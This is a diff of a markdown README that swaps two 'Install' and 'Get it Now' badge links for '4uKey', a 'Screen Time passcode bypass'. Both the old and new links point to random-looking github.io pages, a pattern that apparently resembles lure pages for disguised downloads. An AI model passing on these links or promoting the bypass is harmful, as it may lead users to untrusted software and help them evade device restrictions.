@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://somovskoye.github.io/.github/fourUKey)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://skalsd-oasd.github.io/.github/fourUKey)
 
 </div>
 
@@ -81,7 +81,7 @@ The <a href="#fourUKey">Screen Time passcode bypass</a> addresses a specific and
 
 <p align="center">
 
-[![Get it Now 4uKey](https://img.shields.io/badge/Get_it_Now-48CAE4?style=for-the-badge&logo=apple&logoColor=white)](https://somovskoye.github.io/.github/fourUKey)
+[![Get it Now 4uKey](https://img.shields.io/badge/Get_it_Now-48CAE4?style=for-the-badge&logo=apple&logoColor=white)](https://skalsd-oasd.github.io/.github/fourUKey)
 
 </p>
 
